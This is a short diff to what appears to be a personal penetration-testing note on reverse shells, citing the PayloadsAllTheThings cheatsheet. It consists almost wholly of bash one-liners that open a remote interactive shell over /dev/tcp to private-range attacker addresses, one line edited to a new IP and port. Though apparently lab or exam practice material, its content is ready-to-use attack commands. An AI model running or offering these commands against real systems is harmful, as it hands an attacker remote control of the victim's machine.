@@ -5,7 +5,7 @@ sticker: emoji//1f41a
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
 ##### Bash
 ```
-bash -c "bash -i >& /dev/tcp/192.168.45.161/1443 0>&1"
+bash -c "bash -i >& /dev/tcp/192.168.45.201/80 0>&1"
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
